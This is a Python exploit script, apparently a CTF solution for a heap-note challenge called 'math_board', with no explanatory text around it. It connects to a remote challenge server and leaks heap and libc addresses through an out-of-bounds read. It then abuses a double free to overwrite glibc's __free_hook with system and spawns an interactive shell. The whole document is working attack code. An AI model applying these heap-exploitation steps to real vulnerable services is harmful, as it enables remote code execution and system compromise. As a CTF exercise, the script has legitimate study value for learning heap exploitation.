from ptrlib import *

def write(title, esc):
    sock.sendafter("====\n", "w")
    if len(title) == 0x30:
        sock.send(title)
    else:
        sock.sendline(title)
    sock.recvuntil("save\n")
    if len(esc) == 0x1000:
        sock.send(esc)
    else:
        sock.send(esc)
        sock.send('\x1b')
    return

def read(index):
    sock.sendafter("====\n", "r")
    sock.sendlineafter(":", str(index))
    sock.recvuntil("====\n")
    a = sock.recvline()
    sock.recvuntil("----\n")
    b = sock.recvline()
    return (a, b)

def delete(index):
    sock.sendafter("====\n", "d")
    sock.sendlineafter(":", str(index))
    return

def offset(ofs):
    assert ofs % 8 == 0
    return -0x8000000000000000 + ofs // 8

"""
write          : delete        : read
               | malloc(0x100) |
               | free(0x100)   |
malloc(0x10)   | free(0x30)    | malloc(0x100)
malloc(0x30)   | free(0x1000)  | free(0x100)
malloc(0x1000) | free(0x10)    | 
"""

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./math_board")
sock = Socket("bincat.kr", 31007)
libc_main_arena = 0x3ebc40

# heap leak
write('Hello0', 'Bye') # 0
write('Hello1', 'Bye') # 1
write('Hello2', 'Bye') # 2
delete(2)
delete(1)
delete(0)
heap_base = u64(read(offset(0x555555757340 - 0x555555757270))[1]) - 0x2470
logger.info("heap base = " + hex(heap_base))

# libc leak
addr_note = heap_base + 0x360
fake_note  = p64(addr_note + 0x10) * 2
fake_note += p64(addr_note + 0x48) * 2
write(fake_note, "")
libc_base = u64(read(offset(0x555555757360 - 0x555555757270))[1]) - libc_main_arena - 96
logger.info("libc base = " + hex(libc_base))

# double free
delete(0)
fake_note  = p64(addr_note) * 2
fake_note += p64(0) + p64(0x31)
fake_note += p64(addr_note) * 2
write(fake_note, "")
delete(offset(0x555555757380 - 0x555555757270))

# overwrite __free_hook
write(p64(libc_base + libc.symbol('__free_hook')), 'Bye') # 0
write('/bin/sh', 'Bye') # 1
write(p64(libc_base + libc.symbol('system')), 'Bye') # 2

# get the shell!
delete(1)

sock.interactive()
